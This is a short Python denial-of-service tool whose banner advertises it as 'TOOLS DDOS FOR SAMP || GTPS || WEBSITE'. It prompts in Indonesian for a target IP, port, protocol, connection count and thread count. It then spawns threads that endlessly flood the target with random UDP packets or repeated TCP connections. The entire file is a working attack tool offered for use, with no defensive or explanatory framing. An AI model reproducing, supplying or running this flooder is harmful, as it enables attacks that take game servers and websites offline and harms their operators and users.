#!/usr/bin/env python3
#Code by LeeOn123
#Recode by VL
import random
import socket
import threading

print("""
\u001b[31m
>> MY DISCORD : VL#0934
>> CODE BY LeeOn123 RECODE BY VL
>> TOOLS DDOS FOR SAMP || GTPS || WEBSITE
 ___      ___  ___           ___  ___      ________   ________      ______    ________  
|"  \    /"  ||"  |         |"  \/"  |    |"      "\ |"      "\    /    " \  /"       ) 
 \   \  //  / ||  |          \   \  /     (.  ___  :)(.  ___  :)  // ____  \(:   \___/  
  \   \/. ./  |:  |           \  \/       |: \   ) |||: \   ) || /  /    ) :)\___  \    
   \.    //    \  |___        /\.  \      (| (___\ ||(| (___\ ||(: (____/ //  __/   \   
    \    /    ( \_|:  \      /  \   \     |:       :)|:       :) \        /  /" \   :)  
     \__/      \_______)    |___/\___|    (________/ (________/   \ _____/  (_______/   
                                                                                        """)
ip = str(input("   \u001b[31m[$] \u001b[37mMasukan Ip nya :\u001b[31m  "))
port = int(input("   \u001b[31m[$] \u001b[37mMasukan >>> Port nya :\u001b[31m  "))
choice = str(input("   \u001b[31m[$] \u001b[37mMasukan >>> UDP?(y/n) :\u001b[31m  "))
times = int(input("   \u001b[31m[$] \u001b[37mMasukan >>> Connections :\u001b[31m  "))
threads = int(input("   \u001b[31m[$] \u001b[37mMasukan >>> Threading :\u001b[31m  "))
def run():
	data = random._urandom(1024)
	i = random.choice(("[x]","[$]","[*]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Tok..Tok..Tok..Ada Paket Dari VL Nih!!!")
		except:
			print("[!] Down!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[x]","[$]","[*]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Tok..Tok..Tok..Ada Paket Dari VL Nih!!!")
		except:
			s.close()
			print("[*] Down")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()